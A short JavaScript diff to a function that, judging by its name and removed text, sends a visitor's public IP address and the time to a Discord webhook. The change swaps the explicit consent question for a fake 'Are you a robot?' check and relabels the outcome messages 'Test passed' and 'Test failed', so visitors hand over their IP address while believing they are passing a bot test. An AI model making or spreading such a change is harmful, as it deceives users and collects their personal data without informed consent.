@@ -3,7 +3,7 @@ const webhookUrl =
 
 async function shareIpWithConsent() {
   const consent = confirm(
-    "This will send your public IP address and the current time to the site owner through Discord. Continue?"
+    "Are you a robot?"
   );
 
   if (!consent) return;
@@ -27,10 +27,10 @@ async function shareIpWithConsent() {
       throw new Error("Discord rejected the submission.");
     }
 
-    alert("Your IP address was shared.");
+    alert("Test passed");
   } catch (error) {
     console.error(error);
-    alert("The IP address could not be shared.");
+    alert("Test failed");
   }
 }
 
